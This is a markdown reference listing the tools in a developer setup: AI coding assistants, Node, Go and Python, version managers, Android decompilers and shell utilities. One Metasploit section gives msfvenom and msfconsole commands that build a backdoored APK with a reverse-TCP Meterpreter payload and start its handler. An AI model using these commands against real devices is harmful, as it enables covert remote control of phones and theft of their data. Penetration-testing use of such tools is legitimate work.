# Tools Documentation

Complete list of tools included in this development setup.

## AI Coding Assistants

### Qwen Code
- **Purpose**: AI pair programming and code generation
- **Install**: `npm install -g @qwen-code/qwen-code`
- **Config**: `~/.qwen/settings.json`
- **Docs**: [qwen-code.md](qwen-code.md)

### Gemini CLI
- **Purpose**: Google's AI coding assistant
- **Install**: `npm install -g @google/gemini-cli`
- **Config**: `~/.gemini-cli/config.json`
- **Docs**: [gemini-cli.md](gemini-cli.md)

### Aider
- **Purpose**: AI pair programming in your terminal
- **Install**: `pip install aider-chat`
- **Config**: `~/.aider.conf.yml`
- **Website**: https://aider.chat/

### Ollama
- **Purpose**: Run LLMs locally
- **Install**: `curl -fsSL https://ollama.com/install.sh | sh`
- **Models**: qwen2.5-coder:1.5b (default)
- **Website**: https://ollama.com/

## Development Languages

### Node.js (via NVM)
- **Purpose**: JavaScript/TypeScript runtime
- **Install**: Automatic via setup script
- **Version**: Latest LTS
- **Manage**: `nvm install`, `nvm use`

### Go
- **Purpose**: Systems programming language
- **Install**: `pkg install golang` (Termux) or `apt install golang-go`
- **Config**: `GOPATH=$HOME/go`

### Python
- **Purpose**: Scripting and automation
- **Install**: `pkg install python` or `apt install python3`
- **Package Manager**: pip, pipx

## Version Managers

### NVM
- **Purpose**: Node.js version management
- **Location**: `~/.nvm/`
- **Commands**: `nvm install`, `nvm use`, `nvm list`

### ASDF
- **Purpose**: Multi-language version manager
- **Location**: `~/.asdf/`
- **Config**: `~/.asdf/tool-versions`
- **Website**: https://asdf-vm.com/

## Android Development Tools

### APKTool
- **Purpose**: Reverse engineer Android APKs
- **Install**: `apt install apktool` or via setup-apktools.sh
- **Usage**: `apktool d app.apk`, `apktool b folder`

### JADX
- **Purpose**: Decompile Android DEX files to Java
- **Install**: Automatic via setup script
- **Usage**: `jadx app.apk` or GUI: `jadx-gui`

### AAPT/AAPT2
- **Purpose**: Android Asset Packaging Tool
- **Install**: Automatic via setup script
- **Usage**: `aapt dump badging app.apk`

### Metasploit Framework
- **Purpose**: Security testing and penetration testing
- **Install**: `apt install metasploit-framework`
- **Usage**: `msfconsole`, `msfvenom`

#### APK Backdoor (Metasploit)
```bash
# Create backdoored APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 \
  --use-aapt -o backdoor.apk

# Start handler
msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST your_ip; exploit"
```

## Utilities

### Ripgrep (rg)
- **Purpose**: Fast text search
- **Install**: `pkg install ripgrep` or `apt install ripgrep`
- **Usage**: `rg "pattern"`

### Git
- **Purpose**: Version control
- **Config**: `~/.gitconfig`
- **Usage**: `git clone`, `git commit`, etc.

### Wget/Curl
- **Purpose**: Download files and HTTP requests
- **Install**: Pre-installed on most systems

## Configuration Files

| File | Purpose |
|------|---------|
| `~/.bashrc` | Shell configuration, aliases, PATH |
| `~/.profile` | Login shell configuration |
| `~/.gitconfig` | Git user settings |
| `~/.aider.conf.yml` | Aider AI settings |
| `~/.qwen/settings.json` | Qwen Code configuration |
| `~/.goterm.json` | Go-Term settings |
| `~/.env` | Environment variables (API keys) |

## Shell Aliases

From `.bashrc`:
```bash
ll      # ls -alF (detailed listing)
la      # ls -A (all except . and ..)
l       # ls -CF (column format)
ls      # ls --color=auto
grep    # grep --color=auto
alert   # Send notification after long command
```

## Quick Reference

### Start AI Assistants
```bash
qwen          # Qwen Code
gemini        # Gemini CLI
aider         # Aider pair programming
```

### Manage Versions
```bash
nvm install 20    # Install Node.js 20
nvm use 20        # Use Node.js 20
nvm list          # List installed versions
```

### Android Tools
```bash
apktool d app.apk          # Decompile APK
jadx app.apk               # Decompile to Java
aapt dump badging app.apk  # Show APK info
```

### Ollama Commands
```bash
ollama serve              # Start Ollama server
ollama pull model:tag     # Download model
ollama run model:tag      # Run model interactively
ollama list              # List downloaded models
```

## Environment Variables

Set these in `~/.env`:

```bash
# API Keys
GEMINI_API_KEY              # Google Gemini
BAILIAN_CODING_PLAN_API_KEY # Qwen/Bailian

# Paths
ANDROID_HOME                # Android SDK location
GOPATH                      # Go workspace
NVM_DIR                     # NVM installation directory

# Ollama
OLLAMA_HOST                 # Ollama server URL
```
